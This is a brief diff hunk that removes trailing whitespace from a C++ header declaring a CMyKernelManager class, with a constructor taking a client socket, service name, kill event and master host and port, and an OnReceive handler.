@@ -11,10 +11,10 @@
 #include <tchar.h>
 #include "Manager.h"
 
-class CMyKernelManager : public CManager  
+class CMyKernelManager : public CManager
 {
 public:
-	CMyKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
+	CMyKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent,
 		LPCSTR lpszMasterHost, UINT nMasterPort);
 	virtual ~CMyKernelManager();
 	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
